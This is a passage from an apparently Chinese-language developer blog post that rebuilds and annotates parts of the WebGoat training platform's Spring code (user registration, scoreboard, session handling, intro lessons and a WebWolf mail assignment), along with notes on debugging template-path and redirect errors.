<h3 id="SessionService"><a href="#SessionService" class="headerlink" title="SessionService"></a>SessionService</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.Messages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SessionService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RestartLessonService restartLessonService;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Messages messages;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/service/enable-security.mvc&quot;,produces = &quot;application/json&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">applySecurity</span><span class="params">()</span>&#123;</span><br><span class="line">        webSession.toggleSecurity();</span><br><span class="line">        restartLessonService.restartLesson();</span><br><span class="line">        </span><br><span class="line">        <span class="type">var</span> <span class="variable">msg</span> <span class="operator">=</span> webSession.isSecurityEnable() ? <span class="string">&quot;security.enabled&quot;</span>:<span class="string">&quot;security.disabled&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> messages.getMessage(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="users-2"><a href="#users-2" class="headerlink" title="users"></a>users</h2><h3 id="RegistrationController"><a href="#RegistrationController" class="headerlink" title="RegistrationController"></a>RegistrationController</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Value;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.AuthenticationManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.BindingResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.validation.Valid;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegistrationController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserValidator userValidator;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">private</span> AuthenticationManager authenticationManager;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/registration&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showForm</span><span class="params">(UserForm userForm)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;registration&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/register.mvc&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">registration</span><span class="params">(<span class="meta">@ModelAttribute(&quot;userForm&quot;)</span> <span class="meta">@Valid</span> UserForm userForm, BindingResult bindingResult, HttpServletRequest request)</span> <span class="keyword">throws</span> ServletException&#123;</span><br><span class="line">        userValidator.validate(userForm,bindingResult);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bindingResult.hasErrors())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;registration&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        userService.addUser(userForm.getUsername(),userForm.getPassword());</span><br><span class="line">        request.login(userForm.getUsername(),userForm.getPassword());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/attack&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserValidator"><a href="#UserValidator" class="headerlink" title="UserValidator"></a>UserValidator</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.Errors;</span><br><span class="line"><span class="keyword">import</span> org.springframework.validation.Validator;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="comment">//实现bean的注入,当我们的类不属于@controller @services的时候我们就可以使用@component来标注这个类</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserValidator</span> <span class="keyword">implements</span> <span class="title class_">Validator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">final</span>  UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; clazz)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> UserForm.class.equals(clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(Object o, Errors errors)</span>&#123;</span><br><span class="line">        <span class="type">UserForm</span> <span class="variable">userForm</span> <span class="operator">=</span> (UserForm) o;</span><br><span class="line">        <span class="keyword">if</span> (userRepository.findByUsername(userForm.getUsername()) != <span class="literal">null</span>)&#123;</span><br><span class="line">            errors.rejectValue(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;username.duplicate&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!userForm.getMatchingPassword().equals(userForm.getPassword()))&#123;</span><br><span class="line">            errors.rejectValue(<span class="string">&quot;matchingPassword&quot;</span>,<span class="string">&quot;password.diff&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserForm"><a href="#UserForm" class="headerlink" title="UserForm"></a>UserForm</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.NotNull;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Size;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserForm</span> &#123;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Size(min = 6,max = 45)</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = &quot;[a-z0-9-]*&quot;,message = &quot;can only contain lowercase letters.digits,and -&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"><span class="comment">//    表单数据中的username</span></span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Size(min = 6,max = 10)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="meta">@Size(min = 6,max = 10)</span></span><br><span class="line">    <span class="keyword">private</span> String matchingPassword;</span><br><span class="line">    <span class="meta">@NotNull</span></span><br><span class="line">    <span class="keyword">private</span> String agree;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.PluginMessages;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.Course;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Scoreboard</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span>  UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span>  UserRepository userRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Course course;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PluginMessages pluginMessages;</span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Ranking</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String username;</span><br><span class="line">        <span class="keyword">private</span> List&lt;String&gt; flagsCaptured;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/scoreboard-data&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Ranking&gt; <span class="title function_">getRankings</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;WebGoatUser&gt; allUsers = userRepository.findAll();</span><br><span class="line">        List&lt;Ranking&gt; rankings = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (WebGoatUser user : allUsers)&#123;</span><br><span class="line">            <span class="keyword">if</span> (user.getUsername().startsWith(<span class="string">&quot;csrf-&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">UserTracker</span> <span class="variable">userTracker</span> <span class="operator">=</span> userTrackerRepository.findByUser(user.getUsername());</span><br><span class="line">            rankings.add(<span class="keyword">new</span> <span class="title class_">Ranking</span>(user.getUsername(),challengesSolved(userTracker)));</span><br><span class="line">        &#125;</span><br><span class="line">        rankings.sort((o1,o2) -&gt; o2.getFlagsCaptured().size() - o1.getFlagsCaptured().size());</span><br><span class="line">        <span class="keyword">return</span> rankings;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; <span class="title function_">challengesSolved</span><span class="params">(UserTracker userTracker)</span>&#123;</span><br><span class="line">        List&lt;String&gt; challenges = List.of(<span class="string">&quot;Challenge1&quot;</span>, <span class="string">&quot;Challenge2&quot;</span>, <span class="string">&quot;Challenge3&quot;</span>, <span class="string">&quot;Challenge4&quot;</span>, <span class="string">&quot;Challenge5&quot;</span>, <span class="string">&quot;Challenge6&quot;</span>, <span class="string">&quot;Challenge7&quot;</span>, <span class="string">&quot;Challenge8&quot;</span>, <span class="string">&quot;Challenge9&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> challenges.stream()</span><br><span class="line">                .map(userTracker::getLessonTracker)</span><br><span class="line">                .flatMap(Optional::stream)</span><br><span class="line">                .filter(LessonTracker::isLessonSolved)</span><br><span class="line">                .map(LessonTracker::getLessonName)</span><br><span class="line">                .map(<span class="built_in">this</span>::toLessonTitle)</span><br><span class="line">                .toList();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">toLessonTitle</span><span class="params">(String id)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">titleKey</span> <span class="operator">=</span> course.getLessons().stream()</span><br><span class="line">                .filter(l-&gt;l.getId().equals(id))</span><br><span class="line">                .findFirst()</span><br><span class="line">                .map(Lesson::getTitle)</span><br><span class="line">                .orElse(<span class="string">&quot;No title&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> pluginMessages.getMessage(titleKey,titleKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UserSession"><a href="#UserSession" class="headerlink" title="UserSession"></a>UserSession</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.eventbus.AllowConcurrentEvents;</span><br><span class="line"><span class="keyword">import</span> lombok.AccessLevel;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.data.annotation.Id;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor(access = AccessLevel.PROTECTED)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSession</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> WebGoatUser webGoatUser;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> String sessionId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="lessons-5"><a href="#lessons-5" class="headerlink" title="lessons"></a>lessons</h1><p>从下面开始我们就需要去到真正的题目中去了 我们慢慢分析</p>
<h2 id="webgoat-introduction"><a href="#webgoat-introduction" class="headerlink" title="webgoat_introduction"></a>webgoat_introduction</h2><h3 id="WebGoatIntroduction"><a href="#WebGoatIntroduction" class="headerlink" title="WebGoatIntroduction"></a>WebGoatIntroduction</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.webgoat_introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="comment">//实现bean的注入,当我们的类不属于@controller @services的时候我们就可以使用@component来标注这个类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebGoatIntroduction</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Category.INTRODUCTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;webgoat.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="排错"><a href="#排错" class="headerlink" title="排错"></a>排错</h3><p>这里写完这些之后启动的时候发现出现了一个非常重要的错误,这里记录一下我去寻找错误代码的过程与思路.</p>
<p>这里的错误就是我们打开之后它没有显示我们的adoc文件的内容</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822162820454.png"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822162915462.png" alt="image-20220822162915462"></p>
<p>首先我们需要去查看有无异常信息的抛出</p>
<p>这里给了一个空指针异常</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163116038.png" alt="image-20220822163116038"></p>
<p>我们打个断点去查看哪里出现了问题</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163211392.png" alt="image-20220822163211392"></p>
<p>很明显就是这里的resoucre的名字出现了问题 那么我首先去寻找了一下在哪里有调用了这里computeTemplateResource方法,因为这里很明显传参就出现了问题 其次这里也可以简单的看出来肯定是多了一个&#x2F;或者少了一个&#x2F;导致截取出现了问题 最终路径拼接不起来</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163301810.png" alt="image-20220822163301810"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163252038.png" alt="image-20220822163252038"></p>
<p>就这么几个,我们看一下其实都不是我们自己去调用的,而是thymeleaf去给我们调用的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822163605299.png" alt="image-20220822163605299"></p>
<p>那么我们现在有两种思路第一种 我们根据这错误可能的形成原因去搜索可能存在错误的代码 这里肯定是lessons + …去进行拼接.因此我们直接去搜索lessons 在根据连接操作找到了这行代码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822164616384.png" alt="image-20220822164616384"></p>
<p>这里也是与先前推测的连接略有出入,但是这里也是进行截断操作</p>
<p>很明显这里缺少了一个. 导致在替换的时候出现了问题</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822165450004.png" alt="image-20220822165450004"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822165330017.png" alt="image-20220822165330017"></p>
<p>第二种方式 根据我们现在的代码是针对lessons的,因此我们之间找到container 下面的lessons去翻找代码.</p>
<p>成功解决一项错误</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822181047833.png" alt="image-20220822181047833"></p>
<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>这里的Category其实是一个枚举类型因此这里其实返回的是关于本关卡的介绍 也就是这个是同一类型的关卡</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823220049876.png" alt="image-20220823220049876"></p>
<p>进行两次查找去看看谁调用了这个方法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823220128471.png" alt="image-20220823220128471"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823220201729.png" alt="image-20220823220201729"></p>
<p>这里找到了Cource方法,在这里很明显吗这个类就是一个统计关卡的类</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823221755693.png" alt="image-20220823221755693"></p>
<p>LessonMenuService这里很容易理解这里的这个就是在左边栏进行关卡的展示的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823222538587.png" alt="image-20220823222538587"></p>
<p>我们接下来去看看LessonMenuItem</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823224951738.png" alt="image-20220823224951738"></p>
<p>这里的getTitle()其实是配置文件中的这个</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824184332114.png" alt="image-20220824184332114"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824184532463.png" alt="image-20220824184532463"></p>
<h2 id="webwolf-introduction"><a href="#webwolf-introduction" class="headerlink" title="webwolf_introduction"></a>webwolf_introduction</h2><h3 id="WebWolfIntroduction"><a href="#WebWolfIntroduction" class="headerlink" title="WebWolfIntroduction"></a>WebWolfIntroduction</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.webwolf_introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebWolfIntroduction</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Category.INTRODUCTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span>  String <span class="title function_">getTitle</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;webwolf.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>顺手处理另一个问题</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210017920.png" alt="image-20220822210017920"></p>
<p>这是原版的链接,点击后会爆404错误,这里我们首先想到的肯定是这个路径没有对应进去我们的系统,那么这里我们首先进行全局搜索</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210043380.png" alt="image-20220822210043380"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210149301.png" alt="image-20220822210149301"></p>
<p>这里首先发现并没有这个路径,那么接下来由于WebWolf是我们添加的默认前缀,那么我们只需要去搜索后面的&#x2F;home就好</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210327510.png" alt="image-20220822210327510"></p>
<p>这里除去上面的dockerfile的home,那么我们首先看到的就是这里的addViewController(),这里匹配的路径是&#x2F;home,那么我们就有两个思路去修复,一是去更改html代码,使之进行匹配,第二就是更改这里在前面添加上&#x2F;WebWolf,这里我们进行添加并重启进行尝试</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822210604697.png" alt="image-20220822210604697"></p>
<p>成功跳转 但是这里出现了一个重要的问题 当我们直接从这里去打开 这里跳转的是&#x2F;home 两种情况出现差别主要是处理的逻辑不同</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823185716907.png" alt="image-20220823185716907"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823185649325.png" alt="image-20220823185649325"></p>
<p>我们先看第一种的操作</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823190012198.png" alt="image-20220823190012198"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823190046301.png" alt="image-20220823190046301"></p>
<p>可以清楚的看到这里其实是直接通过链接进行访问的webwolf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823190130574.png" alt="image-20220823190130574"></p>
<p>而第二种其实是通过重定向跳转的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823185925351.png" alt="image-20220823185925351"></p>
<p>稍做修改 就可以成功跳转了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823192905208.png" alt="image-20220823192905208"></p>
<h3 id="MailAssignment"><a href="#MailAssignment" class="headerlink" title="MailAssignment"></a>MailAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.webwolf_introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestClientException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">//@RestController 是@controller和@ResponseBody 的结合</span></span><br><span class="line"><span class="comment">//@Controller 将当前修饰的类注入到springboot ioc容器,使得从该类所在的项目跑起来的过程中,这个类就被实例化</span></span><br><span class="line"><span class="comment">//@ResponseBody 它的作用简短的说就是指该类中的api即可返回的数据 不管对应方法返回map或者其他的object,它会以json字符串的形式返回给客户端</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MailAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String webWolfURL;</span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"><span class="comment">//    restTemplat像一个封装好的网络请求工具类这里我们使用它来去发送url请求</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MailAssignment</span><span class="params">(RestTemplate restTemplate, <span class="meta">@Value(&quot;$&#123;webwolf.mail.url&#125;&quot;)</span> String webWolfURL)</span>&#123;</span><br><span class="line"><span class="comment">//        这里的@Value的值可以在application-webgoat.properties中找到,其实是webwolf的email的url</span></span><br><span class="line">        <span class="built_in">this</span>.restTemplate =restTemplate;</span><br><span class="line">        <span class="built_in">this</span>.webWolfURL = webWolfURL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/WebWolf/mail/send&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">sendEmail</span><span class="params">(<span class="meta">@RequestParam</span> String email)</span>&#123;</span><br><span class="line"><span class="comment">//        获取post请求中的email参数</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> email.substring(<span class="number">0</span>,email.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line"><span class="comment">//        通过先获取@的位置接着截取@之前的值如 123@test.com 就会截取123</span></span><br><span class="line">        <span class="keyword">if</span> (username.equalsIgnoreCase(getWebSession().getUserName()))&#123;</span><br><span class="line"><span class="comment">//            将得到的值忽略大小写与当前用户名进行对比</span></span><br><span class="line">            <span class="type">Email</span> <span class="variable">mailEvent</span> <span class="operator">=</span> Email.builder()</span><br><span class="line"><span class="comment">//                    由于我们在email类中设置了@Data 与 @Builder注解 这样我们就可以进行链式赋值 首先调用了builder()</span></span><br><span class="line">                    .recipient(username)</span><br><span class="line">                    .title(<span class="string">&quot;Test messages from WebWolf&quot;</span>)</span><br><span class="line">                    .contents(<span class="string">&quot;This is a test message from WebWolf, your unique code is: &quot;</span>+ StringUtils.reverse(username))</span><br><span class="line"><span class="comment">//                    这里书写了邮箱内容 并附带了unique code</span></span><br><span class="line">                    .sender(<span class="string">&quot;webgoat@owasp.org&quot;</span>)</span><br><span class="line">                    .build();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                restTemplate.postForEntity(webWolfURL,mailEvent,Object.class);</span><br><span class="line"><span class="comment">//                这里是进行了一个post网络请求 Object.class是以对象发送? 解释看下图</span></span><br><span class="line">            &#125;<span class="keyword">catch</span> (RestClientException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;webwolf.email_failed&quot;</span>).output(e.getMessage()).build();</span><br><span class="line"><span class="comment">//                这里是没请求成功后的返回html的信息 这里进informationMessage进行查看</span></span><br><span class="line"><span class="comment">//                由于之前的messages已经获取了配置文件 ,那么这里我们之间读取配置文件并进行赋值</span></span><br><span class="line">            